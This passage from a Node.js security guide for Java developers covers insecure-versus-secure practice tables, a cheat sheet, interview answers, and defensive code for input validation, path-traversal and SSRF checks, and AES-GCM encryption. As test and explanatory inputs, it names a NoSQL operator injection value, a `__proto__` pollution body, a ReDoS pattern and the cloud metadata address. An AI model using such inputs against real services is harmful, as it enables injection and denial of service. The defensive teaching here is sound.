| `endsWith` or a loose regular expression for origins | compare exact origins |
| no limits on size, rate or time | body limits, timeouts, rate limiting, page caps |
| nested quantifiers in regular expressions | linear patterns, input length limit, `re2` |
| `Math.random()` for tokens | `crypto.randomBytes`, `randomUUID` |
| `===` to compare secrets | `timingSafeEqual` |
| AES-CBC without authentication, ECB, reused IV | AES-256-GCM with a fresh IV |
| `rejectUnauthorized: false` | fix the certificate or trust the right CA |
| secrets and card numbers in logs and URLs | redaction, masking, no sensitive query parameters |
| stack traces in responses | generic message plus a correlation id |
| authorisation only at login, not per object | ownership check on every object |
| installing packages unreviewed, scripts enabled | lockfile, audit, script allow-list, reviewed updates |
| long-lived CI cloud keys, unpinned actions | OIDC federation, pin to a SHA |

## For a Java developer {#java}

| Spring and the JVM | Node.js |
| --- | --- |
| Bean Validation (`@Valid`, `@NotNull`, `@Size`) | zod, ajv or valibot schemas at the edge |
| Jackson `FAIL_ON_UNKNOWN_PROPERTIES`, DTOs | strict schemas that reject unknown keys, explicit field picking |
| JPA and `PreparedStatement` parameters | `pg` `$1` parameters, query builders, ORMs |
| `@PreAuthorize`, method security, ownership checks | middleware plus checks in the service |
| `CsrfFilter`, `SecurityFilterChain` headers | `helmet`, CSRF tokens, SameSite cookies |
| `@CrossOrigin`, `CorsConfigurationSource` | `cors` with an exact allow-list |
| Java deserialisation gadgets, Log4Shell | unsafe `merge`, prototype pollution, `eval`, template injection |
| SSRF defences with an `InetAddress` check | `dns.lookup` and a private address check, egress rules |
| Bucket4j, Resilience4j `RateLimiter` | `express-rate-limit` with Redis, gateway limits |
| OWASP Dependency-Check, Maven enforcer | `pnpm audit`, Renovate, lockfile |
| `SecureRandom`, `MessageDigest.isEqual` | `crypto.randomBytes`, `timingSafeEqual` |
| JCA `Cipher` with `AES/GCM/NoPadding` | `createCipheriv('aes-256-gcm')` |
| SecurityManager (removed), container isolation | permission model, containers, non-root |
| Spring Security as the default framework | assembling libraries (`helmet`, schema validator, auth library), so the discipline is yours |

Try it in the lab: [Defending a Node API in layers](lab:node-security-layers).

## Cheat sheet {#cheatsheet}

| Topic | Remember |
| --- | --- |
| mindset | trust boundaries, least privilege, defence in depth, the server decides |
| validation | schema at the edge, allow-list, strict, reject unknown keys, build a new object, check types |
| SQL | parameters always, allow-list identifiers, least-privilege DB user |
| NoSQL | validate types, reject `$` operator objects |
| commands | `execFile` with an array, no shell, prefer a library, never `eval` |
| objects | pick fields (mass assignment), skip `__proto__` (pollution), `Map`, `hasOwn` |
| SSRF | allow-list hosts, resolve and reject private ranges, no redirects, timeouts, egress rules |
| files | resolve and compare paths, generated names, magic bytes, private storage |
| browser | encode output, sanitise, CSP, helmet, exact CORS, SameSite and CSRF tokens |
| abuse | body and time limits, rate limit with a shared store, page caps, ReDoS-safe regex |
| crypto | `randomBytes`, `timingSafeEqual`, AES-256-GCM with a fresh IV, keys in a KMS, never skip TLS checks |
| data | classify, encrypt, mask, redact logs, generic errors with correlation ids, per-object authorisation |
| supply chain | lockfile, frozen install, audit, script allow-list, reviewed updates, pin CI actions |
| runtime | non-root, read-only, no debug ports, network policies, permission model, patched Node |
| testing | SAST, audit, secret and image scanning, DAST, abuse-case tests, threat model |
| response | audit log, alerts, incident plan: contain, rotate, investigate, notify, learn |

## Interview questions {#questions}

### [basic] What is injection and what is the general defence? {#injection-q}

Injection is when another system reads untrusted data as code or as a command. It covers SQL, NoSQL operators, shell commands, templates, LDAP and log lines.

The general defence is to keep data and code apart:

- parameterised queries;
- argument arrays instead of shell strings;
- output encoding;
- allow-lists for anything that cannot be a parameter.

Add schema validation of input, and least-privilege accounts, so a missed case does less damage.

### [basic] How do you prevent SQL injection in Node.js? {#sql-q}

Use parameterised queries, such as `pool.query('... WHERE owner = $1', [owner])`. Do it in the driver, and in every raw-query path of an ORM or query builder. Then the value is sent separately from the SQL text.

Also:

- allow-list identifiers, such as sort columns;
- escape `LIKE` wildcards;
- validate types at the edge;
- connect as a least-privilege database user.

String concatenation, or template literals with user values, are the bug.

### [basic] What is the difference between input validation and output encoding? {#validate-encode-q}

Validation checks, at the trust boundary, that incoming data is well formed and acceptable: type, length, range and format.

Output encoding makes data safe for the place it is put, such as HTML, an attribute, a URL or an SQL parameter. Then it is shown as data, and never executed.

You need both. Validation reduces what gets in. Encoding stops what remains from being read as code.

### [basic] What is mass assignment and how do you avoid it? {#mass-q}

Copying a whole request body into a model or an update lets a caller set fields they must not control, such as `role`, `balance` or `owner`.

Reject unknown keys with a strict schema. Build the object from fields you explicitly allow. Never accept server-controlled fields from the client.

TypeScript types do not help, because they disappear at runtime.

### [basic] Why is Math.random unsuitable for tokens, and what do you use? {#random-q}

`Math.random` is a predictable pseudo-random generator. An attacker who sees some of its output can predict later values.

Use a cryptographically secure source: `crypto.randomBytes`, `crypto.randomUUID` or `crypto.randomInt`. Compare secrets with `timingSafeEqual`, not `===`.

### [intermediate] What is prototype pollution and how do you prevent it? {#proto-q}

Some merge, clone or path-set functions follow keys such as `__proto__` or `constructor.prototype`. They then write onto `Object.prototype`. Every object in the process gains properties the attacker chose, such as `isAdmin`. That can bypass checks, or crash the service.

`JSON.parse` itself is safe. The danger is the code that processes the parsed data.

To prevent it:

- skip those keys, and use `Object.hasOwn`;
- store dictionaries in a `Map`, or `Object.create(null)`;
- validate with a schema that rejects unknown keys;
- keep libraries updated;
- consider `--disable-proto=delete`.

### [intermediate] What is SSRF and how do you defend against it? {#ssrf-q}

Server-side request forgery makes the server send a request to an address the attacker chose. The target is usually an internal service, or the cloud metadata endpoint, which exposes credentials.

Defences:

- avoid user-supplied URLs, and allow-list hosts;
- allow only https;
- resolve the name, and reject loopback, private, link-local and mapped addresses;
- do not follow redirects automatically;
- set timeouts and size limits;
- add egress network rules, and require IMDSv2.

Beware DNS rebinding, where the address changes between the check and the connection. So connect to the address you checked, or rely on egress rules.

### [intermediate] How do you prevent path traversal when serving files? {#traversal-q}

Resolve the final path with `path.resolve(base, userPath)`. Then check with `path.relative` that it is still inside the base directory: the result must not start with `..`, and must not be absolute. Reject null bytes. If symbolic links are possible, also check `realpath`.

Better, avoid user-controlled paths. Store files under generated ids, and look names up in the database. Use `express.static` for static content. Check archive entry names, to prevent zip slip.

### [intermediate] How do helmet, CSP, CORS and CSRF protections differ? {#headers-q}

They address different attacks, and you use them together:

- **helmet** sets a group of security headers: HSTS, `nosniff`, frame protection, referrer policy and CSP.
- **A Content Security Policy** limits which scripts and resources a page may load. That reduces the damage of XSS.
- **CORS** controls which other origins may read responses. It is not authentication.
- **CSRF protection** stops a hostile site making the browser send an authenticated request. It uses SameSite cookies, anti-CSRF tokens or custom headers, and Origin checks.

### [intermediate] How do you configure CORS safely? {#cors-q}

Use an allow-list of exact origins. Do not use `*` with credentials, and do not reflect the `Origin` header.

- Compare origins exactly. An `endsWith` check also accepts `evilbank.example`.
- Treat the `null` origin as untrusted.
- Allow only the methods and headers you need.

Remember that CORS only restricts reading responses in browsers. It does not replace authentication or CSRF protection, and it does not protect against clients that are not browsers.

### [intermediate] How do you protect a Node.js API against denial of service? {#dos-q}

Limit what any caller can cost:

- body and upload size limits;
- server timeouts (`headersTimeout`, `requestTimeout`, keep-alive limits), and a timeout on every outbound call;
- rate limits per user, key and address, with a shared store such as Redis. Make them stricter on login and OTP endpoints;
- caps on page size and query cost;
- no blocking of the event loop: no synchronous work, and ReDoS-safe regular expressions;
- concurrency limits, and load shedding when overloaded;
- the proxy or WAF, for attacks based on sheer volume.

Respond with 413, 429 and 503, with `Retry-After`.

### [intermediate] Explain ReDoS and how to avoid it. {#redos-q}

A regular expression with nested or overlapping quantifiers, such as `^(a+)+$`, can take exponential time on a crafted input that almost matches. While it runs, the single JavaScript thread serves nobody. In a test, it took about 3 seconds for 28 characters.

To avoid it:

- avoid nested quantifiers;
- limit the input length before matching;
- use a parser for structured text;
- use a linear-time engine like `re2` when users can supply patterns.

### [intermediate] How do you encrypt sensitive data correctly in Node.js? {#encrypt-q}

Use an authenticated mode, AES-256-GCM, through `crypto.createCipheriv`.

- Use a fresh random 12-byte IV for every message.
- Store the IV and the authentication tag with the ciphertext.
- Verify the tag on decryption. An error means tampering, or the wrong key.

Keys come from a KMS or secret manager, and are rotated. Bulk data uses envelope encryption.

Never use ECB, a reused IV, encryption without authentication, or a home-made scheme. For passwords, use a slow hash function, not encryption.

### [intermediate] What do you never log, and how do you enforce it? {#logging-q}

Never log passwords, tokens, session ids, authorisation headers, full card numbers (PAN), card verification values, national ID numbers or other secrets.

Enforce it with:

- structured logging and redaction, such as pino `redact` paths;
- masking helpers;
- keeping sensitive values out of URLs and query strings;
- scrubbing error reports;
- code review, and tests that check log output;
- secret scanning.

Logs should still carry request ids, user ids and outcomes, for the audit trail.

### [deep] How would you review an Express endpoint for security problems? {#review-q}

Follow the request through, and check at each step:

1. **Authentication, then authorisation per object.** Can this user see this account?
2. **Validation** of every input source against a strict schema, including types and sizes.
3. **How data reaches the database**: parameters, allow-listed identifiers, no operator objects.
4. **How it reaches other systems**: `execFile`, URL fetching with SSRF checks, file paths.
5. **What is returned**: only the fields needed, no secrets, generic errors.
6. **Limits**: body size, rate, timeouts, pagination.
7. **Browser concerns**: headers, cookies, CORS and CSRF.
8. **Logging** without secrets, and an audit entry for important actions.
9. **Dependencies**, and their versions.

Then test the abuse cases: another user's id, extra fields, wrong types, huge input, and repeated calls.

### [deep] Design the security controls for a bank's Node.js payments API. {#design-q}

Work in layers:

- **Edge**: TLS, a WAF and gateway rate limits. Strict schema validation that rejects unknown keys. Small body limits, and timeouts.
- **Identity**: OIDC tokens, verified with algorithm and audience checks. MFA, and step-up for payee changes and large transfers. Short-lived tokens.
- **Authorisation**: ownership checks per object, in the service. Role and limit rules, idempotency keys, transfer limits and velocity checks.
- **Data**: parameterised SQL with a least-privilege database user. Field-level AES-GCM for sensitive values, with keys in a KMS. Masking, log redaction, and an append-only audit log.
- **Platform**: non-root, read-only containers. Network policies and egress restrictions. Secrets from a manager. Signed and scanned images. A frozen lockfile and reviewed dependency updates. CI actions pinned, with OIDC.
- **Operations**: SAST, DAST and dependency scanning as gates. Abuse-case tests. Alerts on 401, 403 and anomalies. A rehearsed incident response, including secret rotation.

### [coding] Implement `parseTransfer(input)`: strict validation of `from`, `to`, `amount` (integer cents) and `currency`, optional `reference`. Reject unknown fields, collect every issue, and return a new clean object. {#coding-validate}

```javascript
export class ValidationError extends Error {
  constructor(issues) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.status = 422;
    this.issues = issues;
  }
}

export function parseTransfer(input) {
  const issues = [];
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new ValidationError([{ path: '', message: 'body must be an object' }]);
  }

  const allowed = new Set(['from', 'to', 'amount', 'currency', 'reference']);
  for (const key of Object.keys(input)) {
    if (!allowed.has(key)) issues.push({ path: key, message: 'unknown field' });
  }

  const id = (name) => {
    const v = input[name];
    if (typeof v !== 'string' || !/^[A-Z0-9]{8,12}$/.test(v)) issues.push({ path: name, message: 'must be an account id' });
    return v;
  };
  const from = id('from');
  const to = id('to');
  if (from !== undefined && from === to) issues.push({ path: 'to', message: 'must differ from from' });

  const { amount } = input;
  if (!Number.isInteger(amount) || amount <= 0 || amount > 10_000_000) {
    issues.push({ path: 'amount', message: 'must be a positive integer number of cents, at most 10000000' });
  }
  if (!['SGD', 'USD', 'EUR'].includes(input.currency)) issues.push({ path: 'currency', message: 'unsupported currency' });

  let reference = input.reference;
  if (reference !== undefined) {
    if (typeof reference !== 'string' || reference.length > 140) {
      issues.push({ path: 'reference', message: 'must be text up to 140 characters' });
    } else {
      reference = reference.normalize('NFC').replace(/[\u0000-\u001f\u007f]/g, ' ').trim();
    }
  }

  if (issues.length) throw new ValidationError(issues);
  return { from, to, amount, currency: input.currency, ...(reference ? { reference } : {}) };
}
```

Explain these points:

- It checks that the body is a plain object.
- It rejects every key outside the allow-list, which blocks mass assignment such as `role: 'admin'`.
- It checks each field's type, format and range: integer cents with an upper bound, a currency from a fixed list, and a maximum reference length.
- It collects every issue, so the client can fix them all at once.
- It **builds a new object** from the validated fields only. So `__proto__` and other unexpected keys never reach the result.
- It replaces control characters in the free text, so they cannot forge log lines.
- In my tests, a good request produced a clean object. An extra `role`, a string amount, a negative amount, `from: { $ne: null }`, an array body and a `__proto__` body were all rejected.
- A middleware turns `ValidationError` into a 422 response.

### [coding] Implement `safeJoin(baseDir, userPath)` that prevents path traversal, and `assertPublicHttpUrl(url)` that refuses URLs resolving to private addresses (SSRF). {#coding-safe}

```javascript
import path from 'node:path';
import { lookup } from 'node:dns/promises';
import net from 'node:net';

export function safeJoin(baseDir, userPath) {
  if (typeof userPath !== 'string' || userPath.includes('\0')) throw new Error('invalid path');
  const base = path.resolve(baseDir);
  const target = path.resolve(base, userPath);
  const rel = path.relative(base, target);
  if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) throw new Error('path escapes the base directory');
  return target;
}

export function isPrivateAddress(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split('.').map(Number);
    return a === 10 || a === 127 || a === 0
      || (a === 172 && b >= 16 && b <= 31)
      || (a === 192 && b === 168)
      || (a === 169 && b === 254)
      || (a === 100 && b >= 64 && b <= 127);
  }
  if (net.isIPv6(ip)) {
    const v = ip.toLowerCase();
    if (v.startsWith('::ffff:')) return isPrivateAddress(v.slice(7));
    return v === '::1' || v === '::' || v.startsWith('fc') || v.startsWith('fd')
      || v.startsWith('fe8') || v.startsWith('fe9') || v.startsWith('fea') || v.startsWith('feb');
  }
  return true;
}

export async function assertPublicHttpUrl(raw, { allowedHosts } = {}) {
  const url = new URL(raw);
  if (!['https:', 'http:'].includes(url.protocol)) throw new Error('only http and https');
  if (url.username || url.password) throw new Error('credentials in the URL are not allowed');
  if (allowedHosts && !allowedHosts.includes(url.hostname)) throw new Error('host not allowed');

  const addresses = await lookup(url.hostname, { all: true });
  if (addresses.length === 0 || addresses.some((a) => isPrivateAddress(a.address))) throw new Error('address not allowed');
  return url;
}
```

Explain these points:

- `path.resolve` first collapses `..` segments and absolute paths. So the safety check runs on the real result.
- `path.relative` must not start with `..`, and must not be absolute.
- The URL check parses the URL, and restricts the scheme, credentials and host.
- It then resolves **all** addresses of the name. It rejects the request if any one is loopback, private, link-local (including the metadata address `169.254.169.254`), carrier-grade NAT, or an IPv4-mapped IPv6 address.
- Unknown values are refused, so it fails closed.
- Use the result with `fetch(url, { redirect: 'error', signal: AbortSignal.timeout(3000) })`.
- Add egress network rules too, because DNS rebinding can change the address after the check.
- My tests covered traversal strings with `..`, backslashes, absolute paths, empty and null-byte paths, and private, mapped, metadata and `file:` URLs.

### [coding] Implement `encrypt` and `decrypt` with AES-256-GCM using Node's `crypto`: random IV per message, authentication tag, optional associated data, and tamper detection. {#coding-crypto}

```javascript
import { createCipheriv, createDecipheriv, randomBytes } from 'node:crypto';

export function encrypt(plaintext, key, aad = '') {
  if (key.length !== 32) throw new Error('key must be 32 bytes');
  const iv = randomBytes(12);
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  if (aad) cipher.setAAD(Buffer.from(aad));
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, ciphertext]).toString('base64url');
}

export function decrypt(token, key, aad = '') {
  const raw = Buffer.from(token, 'base64url');
  if (raw.length < 28) throw new Error('invalid token');
  const decipher = createDecipheriv('aes-256-gcm', key, raw.subarray(0, 12));
  decipher.setAuthTag(raw.subarray(12, 28));
  if (aad) decipher.setAAD(Buffer.from(aad));
  return Buffer.concat([decipher.update(raw.subarray(28)), decipher.final()]).toString('utf8');
}

// usage: the key comes from a KMS, the account id is bound as associated data
const key = randomBytes(32);
const token = encrypt('4111111111111111', key, 'acct-1');
decrypt(token, key, 'acct-1');        // '4111111111111111'
decrypt(token, key, 'acct-2');        // throws: the ciphertext was moved to another record
```

Explain these points:

- GCM gives confidentiality and integrity together.
- A new random 12-byte IV is made for every message. Reusing an IV under one key breaks GCM.
- The 16-byte tag authenticates both the ciphertext and the optional associated data. Here that is the account id: not secret, but it ties the ciphertext to its record.
- `decipher.final()` throws if anything was changed. Treat that failure as tampering; never ignore it.
- The token stores `iv | tag | ciphertext` in base64url.
- In my tests, the round trip worked, and two encryptions of the same text differed. A wrong key, a wrong associated-data value, and a single flipped bit all made decryption throw.
- In production, a KMS holds and rotates the key. Large data uses a data key encrypted by the KMS (envelope encryption).
